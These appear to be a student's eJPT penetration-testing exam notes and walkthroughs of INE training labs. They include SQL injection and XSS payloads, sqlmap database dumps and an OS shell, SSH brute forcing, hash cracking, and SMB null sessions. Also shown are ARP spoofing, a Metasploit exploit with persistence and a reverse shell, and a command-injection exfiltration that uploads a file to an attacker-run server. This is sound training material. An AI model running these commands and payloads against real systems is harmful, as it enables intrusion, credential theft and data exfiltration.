## General Notes
**All Tools**
nmap, XXSer, sqlmap, mfsconsole, metasploit, meterpreter, enum4linux, nikto, dirb, dirbuster, feroxbuster, smbclient, sublist3r, fping, masscan, netstat, ffuf, cewl, hydra, john, wpscan, smbclient, nmblookup, wirshark, python, python3, gzip, cat, grep, find, nc, office2john.py,

**Setup**
Open terminals with multiple tabs. Make sure they are root or "sudo su."
Open CherryTree for notes so recovery from lab crashing is made easy.
Execute vpn file provided by exam.
```bash
openvpn filpath.name.opvn
```
```bash
ip a s (leave this open in a different terminal tab. You will need to refernce it continuously.)
route (leave this open in a different terminal tab.)
msfconsole (leave this open in a different terminal tab.)
```
Begin to Enumerate -> research/probe findings -> exploit -> Post Exploitation/Enumerate new resources.

------------

#### Enumeration
```bash
nmap, fping.
nmap ipaddress/24 -sn
nmap ipaddress.1-3,32,53-58 -sV -sC -O -p- > mysubnetnmappscan.txt
fping -g ipaddress/24 -a -q > mysubnetfpingscan.txt
```
This scans the network by ignoring the ping response and checking ports. Run this while doing other things.
```bash
nmap ipaddress/24 -Pn -p 8,20,21,22,23,53,67,78,80,110,137,161,443,445,1433,3306,
```
More specifically, hit a single target with all of nmaps scripts or a specific test.
```bash
nmap ip --script=* --script-args=unsafe=1
nmap --script vuln --script-args=unsafe=1 ipaddress
/usr/share/nmap/scripts/
```
#### Research/Probe Findings
##### Services
msfconsole
- check all services found with "search servicename"

ftp
- null session
- live password attack
- `ls, get filename, cd.`

ssh/telnet
- null session
- live password attack

http/https
- look at server service, and content managmenet service.
- run dirbuster/dirb to enumerate.
--/usr/share/wordlists/dirb/common.txt
--http://demo.ine.local:80/robots.txt
- look for XSS or SQLi. Use burpsuite to analyze/test "easily". Manually test and use xss/sqlmap.
- SLQi: `' OR 1=1` `and 1=1; -- -` `or ‘a’=’a’; -- -`
- XSS: `<script>alert (1)</script>` `<i>some text</i>` `<script>alert(document.cookie)</script>`
- browse the website.
- feroxbuster
- sublist3r
- dirbuster
- gobuster `dir -u http://10.10.10.160 -w /usr/share/wordlists/dirb/common.txt -t 16`
- `ffuf -w wordlist.txt -u http://example.com/FUZZ`
- use the "cookie editor" addon in Firefox.

netbios
Some commands:
```bash
nbtstat -A ipaddress
NET VIEW ipaddress
smbclient -L //ipaddress -N
smbclient -L //ipaddress
nmblookup -A //ipaddress
enum4linux -a //ipaddress
smbmap -H //ipaddress
enum4linux -d -S ipaddress
smbclient //ipaddress/public -N
NET USE \\IP\IPC$ '' /U:''
NET USE \\IP\C$ '' /U:''
WINFO IP -n
```

smb
- null session
- smbclient `smbclient -L //ip` `smbclient //ip/share -N`
- enum4linux `enum4linux -a ip_address`
- nmap scripts `nmap --script *smb* --script-args=unsafe=1 ipaddress`

sql
- null session using smbclient.
- sqlmap
- nmap scripts
- mysql `mysql --user=root --port=13306 -p -h ol-db-ip`

#### Exploitation
##### Metasploit/Meterpreter
```
search exploit
use exploit#
showoptions Check ALL parameters everytime. LHOST has to be on the same subnet.
set OPTION optionhere
exploit
meterpreter shell>getsystem
meterpreter shell>shell
```
SSH Bruteforcing using metasploit:
```
use auxiliary/scanner/ssh/ssh_login
show options
set rhosts 10.10.10.133
set user_file /usr/share/ncrack/minimal.usr
set pass_file /usr/share/ncrack/minimal.usr
set verbose true
run
```

#### Post Exploitation/Enumerate new resources
Find a type of RCE?
[All Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md "All Reverse Shells")
netcat
[Netcat Cheatsheet](https://quickref.me/nc "Netcat Cheatsheet")

Got shell/root?
```bash
cat etc/shadow
cat etc/passwd
sudo /usr/sbin/unshadow /etc/passwd /etc/shadow > unshadowed.password.db
route
find passwd file, may be somewhere else.
```

------------

#### Pivoting/Wireshark/Route

Wireshark Syntax:
```
arp
ip.add == 10.10.10.9
ip.dest == 10.10.10.15
ip.src == 10.10.16.33
tcp.port == 25
ip.addr == 10.10.14.22 and tcp.port == 8080
tcp.flags.syn == 1 and tcp.flags.ack ==0
eth.dst == ff:ff:ff:ff:ff:ff
```
Identify routers by:
> Look at packets that are entering your /24 network.
The destination mac address should be the mac address of the router but not match the dest ip mac.
Set a filter in wireshark to make all packet's destination mac address = router mac address.(last command above)
If a lot of different subnets are targeting this mac address as their destination mac address, it is a router.

Working with routes:
```bash
route
ip route add web-ip/24 via gateway-ip
```

## Lab Notes

**HTTP Traffic Sniffing**
```bash
ping demo.ine.local
ping demossl.ine.local
nmap demo.ine.local
nmap demossl.ine.local
ifconfig
wireshark -i eth1
http contains bee
http
tls
```

------------

**Secret Server**
```bash
ip a s
route
ip route add ip/24 via ip
route
ping ip
```

------------

**Data Exfiltration**
```bash
nmap demo.ine.local
http://demo.ine.local:8000?cmd=pwd
http://demo.ine.local:8000?cmd=ls+-l
http://demo.ine.local:8000?cmd=curl+-h
ifconfig
```
```python
#!/usr/bin/python

import SimpleHTTPServer
import BaseHTTPServer

class SputHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_PUT(self):
        print self.headers
        length = int(self.headers["Content-Length"])
        path = self.translate_path(self.path)
        with open(path, "wb") as dst:
            dst.write(self.rfile.read(length))

if __name__ == '__main__':
    SimpleHTTPServer.test(HandlerClass=SputHTTPRequestHandler)
```

```bash
python server.py 80
http://demo.ine.local:8000?cmd=curl+192.77.184.2+--upload-file+flag.zip
ls -l
unzip flag.zip
cat flag/flag.txt
```

------------

**Burp Suite Basics**
Used: /usr/share/wordlists/dirb/common.txt
```bash
ping demo.ine.local
nmap demo.ine.local
burpsuite
```
Used burp suite to analyze traffic with proxy via foxy proxy.
Used enumeration attack, I would use Dirb or Dirbuster for this.
Used password attack.
Made specific get requests to access files found through enumeration.

The same functionalities were performed in the Burp Suite lab.

------------

**Scanning and OS Fingerprinting**
```bash
ip addr
nmap 192.204.142.0/24
nmap -sP 192.204.142.0/24
nmap -p- pc1.ine.local
nmap -p1-65535 pc1.ine.local
nmap -O pc1.ine.local
nmap pc2.ine.local
nmap -p21 -sV 192.204.142.*
nmap -p21 -sV 192.204.142.* --open
nmap -p- 192.204.142.1,2,3,4,5,6
cat /etc/hosts
nmap -p- 192.204.142.1,2,3,4,5,6
nmap -p27017 --script=mongodb-info target-2 | less
nmap -p27017 --script=mongodb-brute target-2
nmap --script=mysql-* target-1
```

------------

**Nessus**
I've been informed that the Nessus lab / Scanner isn't useful.
localhost:8834

------------

**Dirbuster**
```bash
ping demo.ine.local
nmap demo.ine.local
ifconfig
dirbuster
```
Auto Switch Head and Get, php, Wordlist = usr/share/wordlists/dirb/common.txt
Finds "accounts.xml" which details account credentials.

------------

**Cross Site Scripting**
```bash
ping demo.ine.local
nmap demo.ine.local
ifconfig
```
Finds page with "reflective" query.
Uses BurpSuite/FoxyProxy to get url and query.
```bash
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"
```
Uses burp suite to deliver the follow payload. Don't forget the space after header and the two at the end.
```html
target_host=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&dns-lookup-php-submit-button=Lookup+DNS
```
Delivering this triggered the popup script in browser once its forwarded.

```html
http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=nmap&initials=d&user-poll-php-submit-button=Submit+Vote
```
```bash
xsser --url "http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=d&user-poll-php-submit-button=Submit+Vote"
xsser --url "http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=d&user-poll-php-submit-button=Submit+Vote" --Fp "<script>alert(1)</script>"
http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&initials=d&user-poll-php-submit-button=Submit+Vote
```

------------

**SQL Injection**
```bash
ping demo.ine.local
ifconfig
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title
Do you want to skip test payloads specific to other DBMSes? y
Do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] n
Do you want to keep testing the others (if any)? [y/N] y
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs -D bWAPP --tables
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs -D bWAPP --tables -T users --columns
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs -D bWAPP --tables -T users -C admin,password,email --dump
Do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
Do you want to crack them via a dictionary-based attack? [Y/n/q] n

sqlmap -r request -p title
Do you want to skip test payloads specific for other DBMSes? [Y/n] y
Do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] n
Do you want to keep testing the others (if any)? [y/N] n
title=Hello' AND (SELECT 9239 FROM(SELECT COUNT(*),CONCAT(0x717a787071,(SELECT (ELT(9239=9239,1))),0x7162627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'avHv'='avHv&action=search
title=Hello' AND (SELECT 9239 FROM(SELECT COUNT(*),CONCAT(version(),(SELECT (ELT(9239=9239,1))),0x7162627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'avHv'='avHv&action=search
sqlmap -r request -p title --os-shell
which web application language does the webserver support?: 4
do you want sqlmap to further try to provoke the full path disclosure? y
Got a 302 redirect to 'http://demo.ine.local:80/login.php'. Do you want to follow? y
Redirect is a result of a POST request. Do you want to resend the original POST data to a new location? n
what do you want to use for the writable directory?: 4
```

------------

**Live Bruteforce and Password Cracking**
```bash
ping demo.ine.local
nmap -sV -sS demo.ine.local
ifconfig
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l student -P /usr/share/wordlists/rockyou.txt demo.ine.local ssh
/usr/share/nmap/nselib/data/passwords.lst
echo "administrator" > users
cat users
nmap -p 22 --script ssh-brute --script-args userdb=/root/users demo.ine.local
```

```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set verbose true
exploit
```

```
sessions
ssh root@demo.ine.local
yes
attack
id
```

------------

**Offline Bruteforce and Password Cracking**
```bash
cat /etc/shadow
admin:$6$2PjhBcvO4tMWKi5W$k/UUyb5mb3qTJ6Fr15cReTb0n/DQ9isy7knhpskIEQG.s9eB8auxVqrroksib7uQyiCtrJIgr48XmR8o7Pa7O/:18945:0:99999:7:::
grep -A 18 ENCRYPT_METHOD /etc/login.defs
tail -n 1 /etc/shadow > admin.hash
cat admin.hash
$6$2PjhBcvO4tMWKi5W$k/UUyb5mb3qTJ6Fr15cReTb0n/DQ9isy7knhpskIEQG.s9eB8auxVqrroksib7uQyiCtrJIgr48XmR8o7Pa7O/
```

```bash
hashcat -m 1800 -a 0 admin.hash /root/Desktop/wordlists/1000000-password-seclists.txt
john /etc/shadow --wordlist=/root/Desktop/wordlists/1000000-password-seclists.txt
```

```bash
cd /root/Desktop/
/usr/share/john/office2john.py MS_Word_Document.docx > hash
cat hash
```

office2john.py

```bash
john --wordlist=/root/Desktop/wordlists/1000000-password-seclists.txt hash
```

Remove: MS_Word_Document.docx:
```
$office$*2013*100000*256*16*ff2563844faca58a12fc42c5036f9cf8*ffaf52db903dbcb6ac2db4bab6d343ab*c237403ec97e5f68b7be3324a8633c9ff95e0bb44b1efcf798c70271a54336a2
hashcat -a 0 -m 9600 --status hash /root/Desktop/wordlists/1000000-password-seclists.txt --force
```

------------

**Null Session**
```bash
nmap -sS -sV demo.ine.local
nmap -sU --top-ports 25 demo.ine.local
nmap -sU -sV -p137 demo.ine.local
nmap -sU -sV -p138 demo.ine.local
smbclient -L demo.ine.local -N
smbclient -L demo.ine.local
nmblookup -A demo.ine.local
enum4linux -a demo.ine.local
smbmap -H demo.ine.local
enum4linux -d -S demo.ine.local
smbclient //demo.ine.local/public -N
ls
cd .hidden\
ls
get flag_1
cat flag_1
get flag_1 -
enum4linux -U demo.ine.local
smbmap -H demo.ine.local
smbclient //demo.ine.local/raymond -N
smbclient //demo.ine.local/michael -N
ls
cd dir\
ls
cd flag_2\
ls
get -
```
```bash
enum4linux -s ~/Desktop/wordlists/100-common-passwords.txt demo.ine.local
shadow1 EXISTS, Allows access using username: '', password: ''
smbclient //demo.ine.local/shadow1 -N
ls
get flag_3 -
```

------------

**ARP Poisoning**
You should not need this for the eJPT.
```bash
ip addr
nmap 10.100.13.0/24
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth1 -t 10.100.13.37 -r 10.100.13.36
```
"telnet" in Wireshark.
Found credentials in TCP stream.

------------

**Metasploit**
```
nmap -A -O -p 80 demo.ine.local
searchsploit hfs 2.3
msfconsole -q
search rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
set RHOSTS demo.ine.local
exploit
sysinfo
getuid
getsystem
getuid
background
use exploit/windows/local/persistence_service
show options
set SESSION 1
exploit
background
sessions -K
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.15.2
set LPORT 4444
exploit
migrate -N explorer.exe
background
use post/windows/gather/credentials/windows_autologin
set SESSION 3
exploit
```

------------

**Blackbox 1**

Know how to do the first part.

------------

**Blackbox 2**

------------

**Blackbox 3**

------------
